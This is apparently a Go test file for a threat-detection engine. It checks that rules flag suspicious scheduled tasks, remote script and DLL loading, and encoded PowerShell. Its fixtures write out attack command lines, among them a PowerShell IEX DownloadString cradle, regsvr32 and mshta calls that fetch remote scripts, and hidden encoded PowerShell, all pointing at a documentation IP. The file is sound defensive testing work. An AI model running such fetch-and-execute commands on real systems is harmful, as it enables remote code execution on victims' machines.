package detect

import (
	"strings"
	"testing"
	"tracefall/internal/model"
)

func TestReviewWritableScriptTarget(t *testing.T) {
	tests := []struct {
		proc, cmd string
		writable  bool
	}{
		{"wscript.exe", `C:\Windows\System32\wscript.exe "C:\Users\alice\AppData\Local\Temp\job.vbs"`, true},
		{"cscript.exe", `C:\Windows\System32\cscript.exe //nologo C:\Temp\job.vbs`, true},
		{"wscript.exe", `C:\Tools\wscript.exe //B C:\Temp\job.vbs`, true},
		{"wscript.exe", `wscript.exe C:\Tools\audit.vbs C:\Temp\data.txt`, false},
		{"cscript.exe", `cscript.exe //nologo C:\Tools\audit.vbs C:\Temp\data.vbs`, false},
		{"pwsh.exe", `C:\Tools\pwsh.exe -WorkingDirectory C:\Tools C:\Temp\job.ps1`, true},
		{"powershell.exe", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -InputFormat Text -File C:\Temp\job.ps1`, true},
		{"pwsh.exe", `pwsh.exe -File C:\Tools\audit.ps1 C:\Temp\data.ps1`, false},
		{"powershell.exe", `powershell.exe -Command Write-Output -File C:\Temp\data.ps1`, false},
		{"powershell.exe", `powershell.exe -ConfigurationName -File C:\Temp\data.ps1`, false},
		{"tool.exe", `tool.exe C:\Temp\job.vbs`, false},
		{"tool.exe", `wscript.exe C:\Temp\job.vbs`, false},
	}
	for _, tt := range tests {
		fs := (newScheduledTask{}).Evaluate([]model.Event{taskEvent("e", "ActionReview", "alice", tt.cmd, tt.proc)})
		if tt.writable {
			if len(fs) != 1 || fs[0].Severity != "medium" || fs[0].Confidence != "low" {
				t.Fatalf("%s lost writable script target low-confidence lead: %+v", tt.proc, fs)
			}
		} else if !contextOnlyTaskFindings(fs) {
			t.Fatalf("%s data became writable target: %+v", tt.proc, fs)
		}
	}
}

func TestReviewRemoteActionTargetNotData(t *testing.T) {
	tests := []struct {
		proc, cmd string
		remote    bool
	}{
		{"wscript.exe", `wscript.exe C:\Tools\audit.vbs https://203.0.113.8/api`, false},
		{"cscript.exe", `cscript.exe //nologo C:\Tools\audit.vbs \\host01\share\data.txt`, false},
		{"wscript.exe", `wscript.exe //B //E:VBScript \\host01\share\job.vbs`, true},
		{"cscript.exe", `cscript.exe //nologo \\host01\share\job.vbs`, true},
		{"wscript.exe", `wscript.exe //unknown \\host01\share\job.vbs`, false},
		{"mshta.exe", `mshta.exe https://203.0.113.8/a.hta`, true},
		{"mshta.exe", `mshta.exe C:\Tools\audit.hta https://203.0.113.8/data`, false},
		{"rundll32.exe", `rundll32.exe \\host01\share\job.dll,Entry`, true},
		{"rundll32.exe", `rundll32.exe C:\Tools\audit.dll,Entry \\host01\share\data`, false},
		{"regsvr32.exe", `regsvr32.exe /s /n /u /i:https://203.0.113.8/a.sct scrobj.dll`, true},
		{"regsvr32.exe", `regsvr32.exe /s \\host01\share\job.dll`, true},
		{"regsvr32.exe", `regsvr32.exe C:\Tools\audit.dll https://203.0.113.8/data`, false},
		{"regsvr32.exe", `regsvr32.exe /i:https://203.0.113.8/data C:\Tools\audit.dll`, false},
	}
	for _, tt := range tests {
		e := taskEvent("e", "ActionReview", "alice", tt.cmd, tt.proc)
		fs := (newScheduledTask{}).Evaluate([]model.Event{e})
		if tt.remote {
			if len(fs) != 1 || fs[0].Severity != "high" {
				t.Fatalf("%s remote target lost: %+v", tt.proc, fs)
			}
		} else if !contextOnlyTaskFindings(fs) {
			t.Fatalf("%s data selected as remote target: %+v", tt.proc, fs)
		}
	}
}

func TestReviewEncodedHostFlagOrder(t *testing.T) {
	for _, proc := range []string{"powershell.exe", "pwsh.exe"} {
		for _, args := range []string{"-enc AAAA -w hidden", "-w hidden -enc AAAA", "-enc AAAA -InputFormat Text -w hidden"} {
			e := model.Event{ID: "e", CaseID: "c", EventType: model.EventProcessCreate, ProcessName: proc, ParentProcessName: proc, CommandLine: proc + " " + args}
			for _, r := range []Rule{powershellEncodedCommand{}, suspiciousProcessChain{}} {
				fs := r.Evaluate([]model.Event{e})
				if len(fs) != 1 || fs[0].Severity != "high" {
					t.Fatalf("%s lost order-independent host flags: %+v", r.ID(), fs)
				}
			}
			e.EventType = model.EventScheduledTaskCreate
			fs := (newScheduledTask{}).Evaluate([]model.Event{e})
			if len(fs) != 1 || fs[0].Severity != "high" {
				t.Fatalf("task lost host flags: %+v", fs)
			}
		}
	}
	for _, cmd := range []string{`powershell.exe -enc`, `powershell.exe -enc -w hidden`} {
		if labels := powerShellRuleIndicators(cmd, false); len(labels) != 0 {
			t.Fatalf("missing encoded value invented evidence: %+v", labels)
		}
	}
	if sev, _ := powerShellEvidenceLevel(powerShellRuleIndicators(`powershell.exe -enc AAAA`, false)); sev != "medium" {
		t.Fatal("unknown payload is not independent hostile evidence")
	}
}

func TestReviewEscapedPowerShellDelimiters(t *testing.T) {
	expr := `IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')`
	for _, prefix := range []string{"Write-Output `#; ", "Write-Output `\"; ", "Write-Output `'; ", "Write-Output `<; "} {
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", EventType: model.EventPowerShellScript, CommandLine: prefix + expr}})
		if len(fs) != 1 || fs[0].Severity != "high" {
			t.Fatalf("escaped delimiter hid following expression: %+v", fs)
		}
	}
	for _, body := range []string{"Write-Output #; " + expr, "Write-Output ``#; " + expr, "Write-Output `# #; " + expr, "<# `#; " + expr + " #>", `Write-Output "` + "`#; " + expr + `"`} {
		if labels := powerShellRuleIndicators(body, true); len(labels) != 0 {
			t.Fatalf("real comment/literal activated: %+v", labels)
		}
	}
	if got := withoutPowerShellLiterals("Write-Output `; IEX $value"); dynamicInvocation.MatchString(got) {
		t.Fatal("escaped semicolon became statement boundary")
	}
}

// Each option is host metadata, not the start of script text. Exercise the
// shared selector through all three affected production rules.
func TestReviewHostOptionValues(t *testing.T) {
	for _, cmd := range []string{
		`powershell.exe -InputFormat Text -w hidden -enc AAAA`,
		`powershell.exe -OutputFormat XML -w hidden -enc AAAA`,
		`pwsh.exe -WorkingDirectory C:\Tools -w hidden -enc AAAA`,
		`pwsh.exe -wd C:\Tools -w hidden -enc AAAA`,
		`powershell.exe -ConfigurationName IEX -w hidden -enc AAAA`,
		`powershell.exe -EncodedArguments AAAA -w hidden -enc AAAA`,
		`"C:\Program Files\PowerShell\7\pwsh.exe" -WorkingDirectory C:\Tools -w hidden -enc AAAA`,
	} {
		proc := "powershell.exe"
		if strings.Contains(cmd, "pwsh.exe") {
			proc = "pwsh.exe"
		}
		e := model.Event{ID: "e", CaseID: "c", EventType: model.EventProcessCreate, ProcessName: proc, ParentProcessName: proc, CommandLine: cmd}
		for _, r := range []Rule{powershellEncodedCommand{}, suspiciousProcessChain{}} {
			fs := r.Evaluate([]model.Event{e})
			if len(fs) != 1 || fs[0].Severity != "high" {
				t.Fatalf("%s: host value lost high lead: %+v", r.ID(), fs)
			}
		}
		e.EventType = model.EventScheduledTaskCreate
		fs := (newScheduledTask{}).Evaluate([]model.Event{e})
		if len(fs) != 1 || fs[0].Severity != "high" {
			t.Fatalf("task host value lost high lead: %+v", fs)
		}
	}
	for _, cmd := range []string{
		`powershell.exe -InputFormat Text`, `powershell.exe -OutputFormat XML`,
		`powershell.exe -ConfigurationName IEX`, `pwsh.exe -WorkingDirectory IEX`,
		`powershell.exe -InputFormat`, `pwsh.exe -WorkingDirectory`,
		`powershell.exe -InputFormat -w hidden -enc AAAA`,
		`powershell.exe -ExecutionPolicy -w hidden -enc AAAA`,
		`powershell.exe -w -enc AAAA`,
		`powershell.exe -unknown IEX`,
		`powershell.exe -Command Write-Output -w hidden -enc AAAA`,
		`powershell.exe -File C:\Tools\audit.ps1 -w hidden -enc AAAA`,
	} {
		if labels := powerShellRuleIndicators(cmd, false); len(labels) != 0 {
			t.Fatalf("host value/missing value/script arguments invented evidence: %+v", labels)
		}
	}
}
